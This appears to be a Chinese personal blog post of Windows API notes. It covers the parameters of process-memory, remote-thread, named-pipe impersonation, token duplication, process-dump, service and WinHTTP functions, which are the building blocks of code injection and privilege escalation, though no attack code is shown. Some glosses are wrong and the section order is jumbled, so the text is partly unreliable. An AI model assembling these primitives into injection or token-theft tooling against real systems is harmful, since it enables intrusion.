\u5efa\u7acb\u4e0e\u6307\u5b9a\u8ba1\u7b97\u673a\u670d\u52a1\u63a7\u5236\u7ba1\u7406\u5668\u7684\u8054\u7edc\u5e76\u6253\u5f00\u5176\u6570\u636e\u5e93: OpenSCManagerA \u521b\u5efa\u4e00\u4e2a\u670d\u52a1\u5e76\u628a\u5b83\u52a0\u5165\u5230\u670d\u52a1\u7ba1\u7406\u5668\u6570\u636e\u5e93\uff1a CreateServiceA \u6253\u5f00\u4e00\u4e2a\u670d\u52a1\u5e76\u83b7\u5f97\u53e5\u67c4: OpenServiceA \u5411\u4e00\u4e2a\u670d\u52a1\u53d1\u9001\u63a7\u5236\u6307\u4ee4:ControlService \u4f7f\u670d\u52a1\u4e0eSCM\u94fe\u63a5\uff1a StartServiceCtrlDispatcherA \u6ce8\u518c\u4e00\u4e2a\u51fd\u6570\u6765\u5904\u7406\u670d\u52a1\u63a7\u5236\u8bf7\u6c42: RegisterServiceCtrlHandlerA \u66f4\u65b0\u670d\u52a1\u7684\u72b6\u6001\u4fe1\u606f: SetServiceStatus \u5feb\u7167 \u4ee5\u4e0b\u51fd\u6570\u6216\u7ed3\u6784\u57fa\u672c\u4e0a\u90fd\u7528\u5230\u4e86\u53e6\u4e00\u4e2a\u5934\u6587\u4ef6Tlhelp32.h \u4e3a\u8fdb\u7a0b\u521b\u5efa\u5feb\u7167\u6587\u4ef6(\u8f6c\u50a8): CreateToolhelp32Snapshot \u68c0\u7d22\u5feb\u7167\u4e2d\u9047\u5230\u7684\u7b2c\u4e00\u4e2a\u8fdb\u7a0b\u7684\u4fe1\u606f\uff1a Process32First \u68c0\u7d22\u5feb\u7167\u4e2d\u4e0b\u4e00\u4e2a\u8fdb\u7a0b\u7684\u4fe1\u606f: Process32Next \u5c06\u67d0\u4e2a\u8fdb\u7a0b\u8f6c\u50a8\u4e3a\u5feb\u7167\u5199\u5165\u6587\u4ef6: MiniDumpWriteDump HTTP\u8bf7\u6c42\uff0c\u591a\u6570\u51fd\u6570\u5305\u542b\u5728winhttp.h\u4e2d winhttpopen:\u8fd4\u56de WinHTTP-session \u53e5\u67c4 WinHttpConnect \uff1a\u8fd4\u56de \u94fe\u63a5 \u53e5\u67c4\uff08 handle to an HTTP session for that initial target. \uff09 WinHttpOpenRequest \uff1a\u521b\u5efaHTTP\u8bf7\u6c42\u53e5\u67c4 WinHttpAddRequestHeaders \u8bbe\u7f6eHTTP\u5934 WinHttpSendRequest \u53d1\u9001HTTP\u8bf7\u6c42 WinHttpReceiveResponse \uff1a\u7b49\u5f85http\u56de\u5e94 WinHttpQueryDataAvailable \uff1a\u8fd4\u56deHTTP\u56de\u5e94\u5185\u5bb9\u7684\u5927\u81f4\u4fe1\u606f WinHttpReadData \u8bfb\u53d6HTTP\u56de\u5e94\u5185\u5bb9 COM\u76f8\u5173 CoInitializeEx \uff1a\u521b\u5efaCOM\u73af\u5883 \u4e00\u4e9b\u6570\u636e\u7c7b\u578b NTSTATUS HRESULT title: \u8bb0\u5f55\u4e00\u4e0b\u7528\u8fc7\u7684c++ windows api date: tags: windows\u76f8\u5173 API:\u6536\u5f55\u4e00\u4e0b\u8c03\u8fc7\u7684API \u8fdb\u7a0b\u4e0e\u5185\u5b58 \u6253\u5f00\u4e00\u4e2a\u5df2\u5b58\u5728\u7684\u672c\u5730\u8fdb\u7a0b:OpenProcess HANDLE OpenProcess( DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId ); dwdesiredaccess \u6307\u5b9a\u80fd\u83b7\u5f97\u6307\u5b9a\u8fdb\u7a0b\u54ea\u4e9b\u6743\u9650\u3002\u53ef\u9009\u503c\u5982\u4e0b PROCESS_ALL_ACCESS //\u6240\u6709\u80fd\u83b7\u5f97\u7684\u6743\u9650 PROCESS_CREATE_PROCESS //\u9700\u8981\u521b\u5efa\u4e00\u4e2a\u8fdb\u7a0b PROCESS_CREATE_THREAD //\u9700\u8981\u521b\u5efa\u4e00\u4e2a\u7ebf\u7a0b PROCESS_DUP_HANDLE //\u91cd\u590d\u4f7f\u7528DuplicateHandle\u53e5\u67c4 PROCESS_QUERY_INFORMATION //\u83b7\u5f97\u8fdb\u7a0b\u4fe1\u606f\u7684\u6743\u9650\uff0c\u5982\u5b83\u7684\u9000\u51fa\u4ee3\u7801\u3001\u4f18\u5148\u7ea7 PROCESS_QUERY_LIMITED_INFORMATION /*\u83b7\u5f97\u67d0\u4e9b\u4fe1\u606f\u7684\u6743\u9650\uff0c\u5982\u679c\u83b7\u5f97\u4e86PROCESS_QUERY_INFORMATION\uff0c\u4e5f\u62e5\u6709PROCESS_QUERY_LIMITED_INFORMATION\u6743\u9650*/ PROCESS_SET_INFORMATION //\u8bbe\u7f6e\u67d0\u4e9b\u4fe1\u606f\u7684\u6743\u9650\uff0c\u5982\u8fdb\u7a0b\u4f18\u5148\u7ea7 PROCESS_SET_QUOTA //\u8bbe\u7f6e\u5185\u5b58\u9650\u5236\u7684\u6743\u9650\uff0c\u4f7f\u7528SetProcessWorkingSetSize PROCESS_SUSPEND_RESUME //\u6682\u505c\u6216\u6062\u590d\u8fdb\u7a0b\u7684\u6743\u9650 PROCESS_TERMINATE //\u7ec8\u6b62\u4e00\u4e2a\u8fdb\u7a0b\u7684\u6743\u9650\uff0c\u4f7f\u7528TerminateProcess PROCESS_VM_OPERATION //\u64cd\u4f5c\u8fdb\u7a0b\u5185\u5b58\u7a7a\u95f4\u7684\u6743\u9650(\u53ef\u7528VirtualProtectEx\u548cWriteProcessMemory) PROCESS_VM_READ //\u8bfb\u53d6\u8fdb\u7a0b\u5185\u5b58\u7a7a\u95f4\u7684\u6743\u9650\uff0c\u53ef\u4f7f\u7528ReadProcessMemory PROCESS_VM_WRITE //\u8bfb\u53d6\u8fdb\u7a0b\u5185\u5b58\u7a7a\u95f4\u7684\u6743\u9650\uff0c\u53ef\u4f7f\u7528WriteProcessMemory SYNCHRONIZE //\u7b49\u5f85\u8fdb\u7a0b\u7ec8\u6b62 bInheritHandle \u82e5\u4e3aTRUE\uff0c\u5219\u8868\u793a\u6240\u5f97\u5230\u7684\u8fdb\u7a0b\u53e5\u67c4\u53ef\u88ab\u7ee7\u627f dwProcessId \u8868\u793a\u8981\u83b7\u53d6\u7684\u8fdb\u7a0b\u7684PID \u51fd\u6570\u6210\u529f\u6267\u884c\uff0c\u5219\u8fd4\u56de\u6307\u5b9a\u8fdb\u7a0b\u7684\u53e5\u67c4\u3002\u53cd\u4e4b\u5219NULL\u3002 \u5728\u6307\u5b9a\u8fdb\u7a0b\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u4e2d\u4fdd\u7559\uff0c\u5f00\u8f9f\uff0c\u7981\u7528\u4e00\u6bb5\u533a\u57df : VirtualAllocEx LPVOID VirtualAllocEx( HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect ); hProcess \u6307\u5b9a\u7684\u8fdb\u7a0b\u7684\u53e5\u67c4\u3002\u8be5\u53e5\u67c4\u9700\u6709 PROCESS_VM_OPERATION \u6743\u9650\uff08\u64cd\u4f5c\u8fdb\u7a0b\u5185\u5b58\u7a7a\u95f4\u7684\u6743\u9650\uff09 lpAddress \u4e00\u4e2a\u6307\u9488\uff0c\u7528\u4e8e\u9009\u62e9\u4f60\u60f3\u5206\u914d\u7684\u5185\u5b58\u7684\u5f00\u59cb\u5730\u5740\u3002\u5982\u679c\u586bNULL\uff0c\u5219\u7531dwsize\u7684\u8bbe\u7f6e\u6765\u81ea\u52a8\u5206\u914d\u3002 dwSize \u6b32\u5206\u914d\u7684\u5185\u5b58\u5927\u5c0f\uff08\u5b57\u8282\u5355\u4f4d\uff09\u3002\u5b9e\u9645\u5206\u914d\u7684\u5927\u5c0f\u662f\u8be5\u503c\u4e0e\u9875\u5185\u5b58\u5bf9\u9f50\u540e\u7684\u7ed3\u679c\u3002\u5982\u679clpAddress\u4e3aNULL\uff0c\u5219\u4f1a\u9009\u4e2d\u4ece\u8fdb\u7a0b\u9996\u5730\u5740\u5230dwSize\u7684\u9875\u5bf9\u9f50\u540e\u7684\u5185\u5b58\u533a\u57df \u5982\u679clpAddress\u4e0d\u4e3aNULL\uff0c\u5219\u9009\u5b9alpaddress\u5230lpaddress+dwsize\u7684\u6309\u7167\u9875\u5bf9\u9f50\u540e\u7684\u5185\u5b58\u533a\u57df\u3002 flAllocationType \u5185\u5b58\u5206\u914d\u7684\u7c7b\u578b\u3002\u6709\u5f88\u591a\u503c\uff0cMSDN\u4e0a\u6709\u8bb0\u5f55\u3002 https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex \u8fd9\u4e2a\u503c\u7528\u6765\u786e\u5b9a\u4e00\u6bb5\u5185\u5b58\u533a\u57df\u7528\u4e8e\u88ab\u7f6e0(commit)\u8fd8\u662f\u4fdd\u7559(reserve)\u8fd8\u662f\u7981\u7528(reset) flProtect \u5185\u5b58\u4fdd\u62a4\u5e38\u6570 PAGE_NOACCESS PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE \u82e5\u51fd\u6570\u6267\u884c\u6210\u529f\uff0c\u5219\u8fd4\u56de\u5206\u914d\u7684\u5185\u5b58\u5730\u5740\u7684\u57fa\u5730\u5740\u3002 \u5728\u6307\u5b9a\u8fdb\u7a0b\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u4e2d\u91ca\u653e\u6216decommit\u4e00\u6bb5\u533a\u57df : VirtualFreeEx BOOL VirtualFreeEx( HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType ); hprocess \u8fdb\u7a0b\u53e5\u67c4\uff0c\u9700\u6709 PROCESS_VM_OPERATION \u6743\u9650 lpaddress \u4e00\u4e2a\u6307\u5411\u9700\u8981\u88ab\u91ca\u653e\u6216decommit\u5185\u5b58\u533a\u57df\u9996\u5730\u5740\u7684\u6307\u9488\u3002\u82e5dwfreetype\u4e3amem_release(\u91ca\u653e),\u5219\u8fd9\u91cc\u5e94\u8be5\u586b\u5165VirtualAllocEx\u65b9\u6cd5\u8fd4\u56de\u7684\u4fdd\u7559\u7684\u5185\u5b58\u533a\u57df\u7684\u57fa\u5730\u5740\u3002 dwsize \u9700\u8981\u88abdecommit\u7684\u5185\u5b58\u5927\u5c0f\u3002 \u82e5dwfreetype\u4e3aMEM_RELEASE \u5219\u6b64\u5904\u586b0 \u82e5\u4e3aMEM_DECOMMIT\uff0c\u5219\u6b64\u5904\u586b\u5185\u5b58\u5927\u5c0f\u3002 \u9009\u5b9alpaddress\u5230lpaddress+dwsize\u7684\u6309\u7167\u9875\u5bf9\u9f50\u540e\u7684\u5185\u5b58\u533a\u57df\u3002 dwfreetype \u9700\u8981\u5bf9\u5185\u5b58\u533a\u57df\u8fdb\u884c\u7684\u64cd\u4f5c\u3002\u6709MEM_DECOMMIT\u548cMEM_RELEASE\uff0c\u66f4\u591a\u53c2\u6570\u53c2\u8003MSDNhttps\\://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualfreeex \u82e5\u51fd\u6570\u6267\u884c\u6210\u529f\u5219\u8fd4\u56de\u4e00\u4e2a\u975e\u96f6\u503c\uff0c\u4e0d\u6210\u529f\u5219\u8fd4\u56de0 \u5411\u6307\u5b9a\u8fdb\u7a0b\u7684\u5185\u5b58\u533a\u57df\u5199\u5165: WriteProcessMemory BOOL WriteProcessMemory( HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten ); hprocess \u8fdb\u7a0b\u53e5\u67c4 lpbaseaddress \u9700\u8981\u5199\u5165\u7684\u5185\u5b58\u533a\u57df\u7684\u8d77\u59cb\u5730\u5740\u6307\u9488 lpbuffer \u6307\u5411\u7f13\u51b2\u533a\u7684\u6307\u9488\uff0c\u8be5\u7f13\u51b2\u533a\u5305\u542b\u8981\u5728\u6307\u5b9a\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\u4e2d\u5199\u5165\u7684\u6570\u636e\u3002 nsize \u9700\u8981\u5199\u5165\u7684\u6570\u636e\u5927\u5c0f\uff08\u5b57\u8282\u5355\u4f4d\uff09 lpNumberOfBytesWritten \u53ef\u9009\uff0c\u7528\u6765\u5b58\u653e\u201d\u8981\u88ab\u5199\u5165\u7684\u6570\u636e\u201c\u7684\u53d8\u91cf \u82e5\u6210\u529f\u5219\u8fd4\u56de\u975e0\u503c\uff0c\u53cd\u4e4b\u52190 \u5728\u4e00\u4e2a\u8fdb\u7a0b\u5185\u5b58\u7a7a\u95f4\u4e2d\u521b\u5efa\u4e00\u4e2a\u7ebf\u7a0b\uff1aCreateRemoteThread HANDLE CreateRemoteThread( HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId ); hprocess \u8fdb\u7a0b\u53e5\u67c4 lpThreadAttributes \u5b89\u5168\u63cf\u8ff0\u7b26 dwStackSize \u6808\u5927\u5c0f\uff0c\u82e5\u4e3a0\u5219\u4e3a\u9ed8\u8ba4\u503c lpStartAddress \u8981\u521b\u5efa\u7684\u7ebf\u7a0b\u7684\u5b9e\u73b0\u51fd\u6570\u7684\u9996\u5730\u5740 lpParameter \u4f20\u9012\u7ed9\u7ebf\u7a0b\u51fd\u6570\u7684\u53c2\u6570 dwCreationFlags \u7ebf\u7a0b\u63a7\u5236\u53c2\u6570 0 The thread runs immediately after creation. \u200b CREATE_SUSPENDED 0x00000004 The thread is created in a suspended state, and does not run until the ResumeThread function is called. \u200b STACK_SIZE_PARAM_IS_A_RESERVATION 0x00010000 The ** dwStackSize parameter specifies the initial reserve size of the stack. If this flag is not specified, ** dwStackSize specifies the commit size. lpThreadId \u7ebf\u7a0b\u6807\u8bc6\u7b26\uff0c\u5982\u679c\u7ebf\u7a0b\u4e0d\u8fd4\u56de\u6807\u8bc6\u7b26\u5219\u6b64\u9879\u586bNULL \u5173\u95ed\u4e00\u4e2a\u53e5\u67c4:CloseHandle BOOL CloseHandle( HANDLE hObject ); hobject \u8981\u88ab\u5173\u95ed\u7684\u53e5\u67c4 \u6210\u529f\u5219\u8fd4\u56de\u975e0\u503c\uff0c\u53cd\u4e4b\u52190 RtlSecureZeroMemory \uff1a\u4ee5\u5b89\u5168\u65b9\u5f0f\u75280\u586b\u5145\u5185\u5b58 PVOID RtlSecureZeroMemory( PVOID ptr, SIZE_T cnt ); ptr \u6307\u5411\u5185\u5b58\u7684\u6307\u9488 cnt \u586b\u5145\u7684\u5b57\u8282\u6570 \u4ee4\u724c\u4e0e\u547d\u540d\u7ba1\u9053 \u521b\u5efa\u547d\u540d\u7ba1\u9053\u53e5\u67c4:CreateNamedPipeA HANDLE CreateNamedPipeA( LPCSTR lpName, DWORD dwOpenMode, DWORD dwPipeMode, DWORD nMaxInstances, DWORD nOutBufferSize, DWORD nInBufferSize, DWORD nDefaultTimeOut, LPSECURITY_ATTRIBUTES lpSecurityAttributes ); lpName \u552f\u4e00\u7684\u7ba1\u9053\u540d\u3002\u683c\u5f0f\u662f\u56fa\u5b9a\u7684: \\.\\pipe*pipename* dwOpenMode \u7ba1\u9053\u7684\u5f00\u542f\u65b9\u5f0f\u3002\u6709\u4e09\u79cd\uff1a1.\u6570\u636e\u5728\u670d\u52a1\u5668\u548c\u5ba2\u6237\u673a\u53cc\u5411\u6d41\u901a PIPE_ACCESS_DUPLEX \u30022.\u6570\u636e\u53ea\u80fd\u4ece\u670d\u52a1\u5668\u6d41\u5411\u5ba2\u6237\u673a PIPE_ACCESS_OUTBOUND \u30023.\u6570\u636e\u53ea\u80fd\u4ece\u5ba2\u6237\u673a\u6d41\u5411\u670d\u52a1\u5668 PIPE_ACCESS_INBOUND \u3002\u5177\u4f53\u8bf7\u53c2\u8003\u5b98\u65b9\u6587\u6863\u3002\u4ee5\u53ca\u4e00\u4e9b\u9644\u52a0\u53c2\u6570\uff0c\u8be6\u60c5\u53c2\u8003\u5b98\u65b9\u6587\u6863 https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea dwPipeMode \u7ba1\u9053\u901a\u4fe1\u65b9\u5f0f\u3002\u6307\u5b9a\u5b57\u8282\u6d41\u6216\u8005\u6d88\u606f\u6d41\u901a\u4fe1\uff0c\u6307\u5b9a\u8fdc\u7a0b\u94fe\u63a5\u7684\u8bbf\u95ee\u65b9\u5f0f\uff0c\u6307\u5b9a\u7b49\u5f85\u65b9\u5f0f\uff0c\u8be6\u60c5\u53c2\u8003\u5b98\u65b9\u6587\u6863 nMaxInstancees \u7ba1\u9053\u7684\u6700\u5927\u5b9e\u4f8b\u6570 nOutBufferSize\\&nInBufferSize \u4e3a\u8f93\u51fa&\u8f93\u5165\u7f13\u5b58\u533a\u4fdd\u7559\u7684\u5185\u5b58\u5b57\u8282\u5927\u5c0f nDefaultTimeOut \u8bbe\u5b9a\u8d85\u65f6\u503c\u3002\u7f6e0\u5219\u4e3a50ms lpSecurityAttributes \u8bbe\u7f6e\u5b89\u5168\u63cf\u8ff0\u7b26 \u82e5\u51fd\u6570\u6267\u884c\u6210\u529f\u5219\u8fd4\u56de\u7ba1\u9053\u670d\u52a1\u5668\u53e5\u67c4\u3002\u53cd\u4e4b\u5219\u8fd4\u56de INVALID_HANDLE_VALUE \u5f00\u542f\u4e00\u4e2a\u547d\u540d\u7ba1\u9053\u7b49\u5f85\u94fe\u63a5: ConnectNamedPipe BOOL ConnectNamedPipe( HANDLE hNamedPipe, LPOVERLAPPED lpOverlapped ); hNamedPipe \u6307\u5b9a\u4e00\u4e2a\u547d\u540d\u7ba1\u9053\u53e5\u67c4\uff0c\u8be5\u53e5\u67c4\u7531CreateNamedPipe\u51fd\u6570\u8fd4\u56de lpOverlapped \u4e00\u4e2a\u6307\u5411\u91cd\u53e0\u7ed3\u6784\u7684\u6307\u9488\uff0c\u4e00\u822c\u4e3aNULL\u3002\u8be6\u60c5\u53c2\u8003\u5b98\u65b9\u6587\u6863 https://docs.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-connectnamedpipe \u4e00\u822c\u6765\u8bf4\uff0c\u5f53\u7531\u5ba2\u6237\u673a\u8fde\u4e0a\u65f6\u8fd4\u56detrue\uff0c\u6ca1\u6709\u5ba2\u6237\u673a\u94fe\u63a5\u6216\u94fe\u63a5\u4e22\u5931\u8fd4\u56defalse \u6a21\u62df\u4e00\u4e2a\u547d\u540d\u7ba1\u9053\u5ba2\u6237\u7aef:ImpersonateNamedPipeClient BOOL ImpersonateNamedPipeClient( HANDLE hNamedPipe ); hNamedPipe \u5373\u6307\u5b9a\u7684\u547d\u540d\u7ba1\u9053\u670d\u52a1\u7aef\u3002 \u8fd9\u4e2a\u51fd\u6570\u6709\u4e2a\u5751\u70b9\u662f\uff0c\u670d\u52a1\u7aef\u624d\u80fd\u7528\u8fd9\u4e2a\u51fd\u6570\uff0c\u4e14\u5fc5\u987b\u5728\u670d\u52a1\u7aef\u8bfb\u53d6\u5ba2\u6237\u7aef\u4f20\u6765\u7684\u6570\u636e\u540e\u624d\u80fd\u6210\u529f\uff0c\u5426\u5219\u5c31\u4f1a\u8fd4\u56de1368\u9519\u8bef\u3002 \u83b7\u53d6\u5f53\u524d\u7ebf\u7a0b\u4ee4\u724c\u53e5\u67c4: GetCurrentThreadToken HANDLE GetCurrentThreadToken(); \u65e0\u53c2\u6570\uff0c\u76f4\u63a5\u8fd4\u56de\u5f53\u524d\u7ebf\u7a0b\u865a\u62df\u53e5\u67c4 \u4ee5\u4ee4\u724c\u521b\u5efa\u4e00\u4e2a\u8fdb\u7a0b\uff081\uff09: CreateProcessWithTokenW BOOL CreateProcessWithTokenW( HANDLE hToken, DWORD dwLogonFlags, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation ); \u6709\u70b9\u4e0d\u61c2\uff0c\u94fe\u63a5\u5728\u8fd9\u91cc https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw hToken \u8868\u793a\u7528\u6237\u7684\u4ee4\u724c \u5fc5\u987b\u6709 TOKEN_QUERY, TOKEN_DUPLICATE, and TOKEN_ASSIGN_PRIMARY \u6743\u9650 dwLogonFlags \u767b\u9646\u9009\u9879\u3002 LOGON_WITH_PROFILE \u6216 LOGON_NETCREDENTIALS_ONLY lpApplicationName \u8981\u88ab\u6267\u884c\u7684\u6a21\u5757\u3002\uff08\u6bd4\u5982 C:\\Windows\\system32\\notepad.exe ) lpCommandLine \u8981\u88ab\u6267\u884c\u7684\u547d\u4ee4\u3002\u5982\u679c\u4e3aNULL\u5219\u628a lpApplicationName \u5f53\u4f5c\u8981\u6267\u884c\u7684\u547d\u4ee4 dwCreationFlags \u63a7\u5236\u8fdb\u7a0b\u7684\u521b\u5efa\u65b9\u5f0f\u3002\u53c2\u8003MSDN lpEnvironment \u6307\u5411\u65b0\u8fdb\u7a0b\u73af\u5883\u5757\u7684\u6307\u9488\u3002 lpCurrentDirectory \u6307\u5411\u8fdb\u7a0b\u7684\u201c\u5f53\u524d\u76ee\u5f55\u201d\u8def\u5f84\u3002\u82e5NULL\u5219\u201c\u5f53\u524d\u76ee\u5f55\u201d\u4e3a\u8c03\u7528\u7a0b\u5e8f\u7684\u201c\u5f53\u524d\u76ee\u5f55\u201d lpStartUpInfo \u6307\u5411 STARTUPINFO \u6216 STARTUPINFOEX \u7ed3\u6784\u4f53 lpProcessInformation \u6307\u5411 PROCESS_INFORMATION \u7ed3\u679c\u7684\u6307\u9488 \u5751\u70b9\uff1a\u8c03\u7528\u8be5\u51fd\u6570\u7684\u8fdb\u7a0b\u5fc5\u987b\u6709 SE_IMPERSONATE_NAME \u6743\u9650\uff0c\u4e0d\u7136\u4f1a\u8fd4\u56deERROR:1314 \u4ee5\u4ee4\u724c\u521b\u5efa\u4e00\u4e2a\u8fdb\u7a0b\uff082\uff09: CreateProcessAsUserA BOOL CreateProcessAsUserA( HANDLE hToken, LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation ); \u5927\u81f4\u4e0a\u4e0eCreateProcessWithTokenW\u4e00\u6837\u3002 \u4f46\u662f\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u7684\u8fdb\u7a0b\u5fc5\u987b\u6709 SE_INCREASE_QUOTA_NAME \uff0c\u6216\u8005 SE_ASSIGNPRIMARYTOKEN_NAME \u6743\u9650\uff0c\u4e0d\u7136\u4f1a\u8fd4\u56deERROR:1314 \u4e3a\u5df2\u5b58\u5728\u7684Token\u521b\u5efa\u526f\u672c: DuplicateTokenEx BOOL DuplicateTokenEx( HANDLE hExistingToken, DWORD dwDesiredAccess, LPSECURITY_ATTRIBUTES lpTokenAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType, PHANDLE phNewToken ); hExistingToken \u4e00\u4e2a\u6307\u9488\uff0c\u6307\u5411\u4e00\u4e2a\u6709 TOKEN_DUPLICATE \u6743\u7684Token dwDesiredAccess \u4e3a\u65b0Token\u8bbe\u7f6e\u6743\u9650\u3002\u82e5\u7f6e0\u5219\u8868\u793a\u6743\u9650\u4e0e\u539fToken\u76f8\u540c\u3002 \u4e0b\u9762\u662f\u6743\u9650\u5217\u8868 https://docs.microsoft.com/en-us/windows/win32/secauthz/access-rights-for-access-token-objects lpTokenAttributes \u6307\u5411\u5b89\u5168\u63cf\u8ff0\u7b26\u7684\u6307\u9488\u3002\u82e5\u4e3aNULL\uff0c\u5219\u4e3a\u9ed8\u8ba4\u5b89\u5168\u63cf\u8ff0\u7b26\u4e14\u53e5\u67c4\u4e0d\u80fd\u88ab\u7ee7\u627f ImpersonationLevel \u4ece SECURITY_IMPERSONATION_LEVEL \u4e2d\u9009\u62e9\u4e00\u4e2a\u503c\u586b\u5165\u3002\u51b3\u5b9a\u6a21\u4eff\u7684\u7a0b\u5ea6\u3002 TokenType \u9009\u62e9 TokenPrimary or TokenImpersonation \u586b\u5165\u3002\u51b3\u5b9aToken\u662fprimary token\uff08\u80fd\u88ab\u7528\u6765\u6267\u884cCreateProcessAsUser\uff09\u8fd8\u662fimpersonation token phNewToken \u6307\u9488\uff0c\u6307\u5411\u627f\u8f7d\u65b0Token\u7684Handle\u53d8\u91cf\u3002 \u6587\u4ef6IO \u83b7\u5f97\u6587\u4ef6\u53e5\u67c4\uff1aGetMoudleHandleA HMODULE GetModuleHandleA( LPCSTR lpModuleName ); lpModuleName\u5373\u8981\u83b7\u53d6\u7684\u6587\u4ef6\u53e5\u67c4\u7684\u6587\u4ef6\u540d\uff0c\u53ef\u4e3aexe\u6216dll\u3002 \u82e5\u6587\u4ef6\u540d\u6ca1\u6709\u540e\u7f00\u540d\u5219\u9ed8\u8ba4\u89c6\u4e3adll\u6587\u4ef6\u3002 \u82e5\u8be5\u9879\u4e3aNULL\uff0c\u5219\u8fd4\u56de\u5f53\u524d\u8fdb\u7a0b\u7684\u6587\u4ef6\u53e5\u67c4\u3002 \u5b58\u5728\u4e8eKerner32.dll\u4e2d \u8fd9\u91cc\u4ecb\u7ecd\u4e00\u4e9bHMOUDLE\u662f\u4e2a\u4ec0\u4e48\u73a9\u610f \u4e00\u822c\u5c31\u662f\u4e00\u4e2a\u7ebf\u6027\u5730\u5740\uff0c\u7528\u4e8e\u8bb0\u5f55\u4e00\u4e2a\u6587\u4ef6\u53e5\u67c4\u7684\u5730\u5740\u3002 \u4ecedll\u6587\u4ef6\u53e5\u67c4\u4e2d\u83b7\u5f97\u51fd\u6570\uff1aGetProcAddress FARPROC GetProcAddress( HMODULE hModule, LPCSTR lpProcName ); hmodule \u8868\u793a\u8981\u4f20\u5165\u7684dll\u6587\u4ef6\u53e5\u67c4\u3002\u8fd9\u4e2a\u53e5\u67c4\u53ef\u4ee5\u7531 LoadLibrary , LoadLibraryEx , LoadPackagedLibrary , or GetModuleHandle \u7b49\u65b9\u6cd5\u5f97\u5230\u3002 lpProcName\u8868\u793a\u8981\u4ecedll\u6587\u4ef6\u4e2d\u83b7\u5f97\u7684\u51fd\u6570\u6ca1\u6216\u8005\u53d8\u91cf\u540d\u3002 \u82e5\u51fd\u6570\u6267\u884c\u4e0d\u6210\u529f\uff0c\u5219\u8fd4\u56deNULL\uff0c\u5426\u5219\u8fd4\u56de\u51fd\u6570\u6216\u8005\u53d8\u91cf\u7684\u5730\u5740 \u83b7\u5f97\u4e00\u4e2a\u5df2\u5b58\u5728\u6587\u4ef6\u53e5\u67c4\u6216\u8005\u65b0\u5efa\u6587\u4ef6\u53e5\u67c4:CreateFile HANDLE CreateFileW( LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile ); lpFileName \u6587\u4ef6\u8def\u5f84 dwDesiredAccess \u5bf9\u6587\u4ef6\u7684\u8bbf\u95ee\u63a7\u5236\uff1a\u8bfb\uff0c\u5199\u3002 GENERIC_READ , GENERIC_WRITE , or both ( GENERIC_READ | GENERIC_WRITE ) dwShareMode \u96f6\u8868\u793a\u4e0d\u5171\u4eab\uff1b FILE_SHARE_READ \u548c / \u6216 FILE_SHARE_WRITE \u8868\u793a\u5141\u8bb8\u5bf9\u6587\u4ef6\u8fdb\u884c\u5171\u4eab\u8bbf\u95ee lpSecurityAttributes \u5b89\u5168\u63cf\u8ff0\u7b26 dwCreationDisposition \u5728\u6587\u4ef6\u4e0d\u5b58\u5728\u6216\u5b58\u5728\u65f6\u91c7\u53d6\u7684\u64cd\u4f5c dwFlagsAndAttributes \u8bbe\u7f6e\u6587\u4ef6\u6807\u5fd7\u4f4d hTemplateFile \u591a\u6570\u60c5\u51b5\u4e0b\u4e3aNULL \u5199\u6587\u4ef6: ReadFile BOOL WriteFile( HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped ); hFile \u6587\u4ef6\u53e5\u67c4 lpBuffer \u8981\u5199\u5165\u7684\u6570\u636e\u7f13\u5b58\u533a nNumberOfBytesToWrite \u8981\u5199\u5165\u7684\u5b57\u8282\u6570 lpNumberOfBytesWritten \u8bbe\u7f6e\u4e00\u4e2a\u53d8\u91cf\uff0c\u7528\u6765\u63a5\u6536\u5199\u5165\u7684\u5185\u5bb9 lpOverlapped \u901a\u5e38\u4e3aNULL \u8bfb\u6587\u4ef6: ReadFile BOOL ReadFile( HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped ); \u548cWriteFile\u5dee\u4e0d\u591a\uff0c8\u8bf4\u4e86 \u670d\u52a1 \u5efa\u7acb\u4e0e\u6307\u5b9a\u8ba1\u7b97\u673a\u670d\u52a1\u63a7\u5236\u7ba1\u7406\u5668\u7684\u8054\u7edc\u5e76\u6253\u5f00\u5176\u6570\u636e\u5e93: OpenSCManagerA SC_HANDLE OpenSCManagerA( LPCSTR lpMachineName, LPCSTR lpDatabaseName, DWORD dwDesiredAccess ); 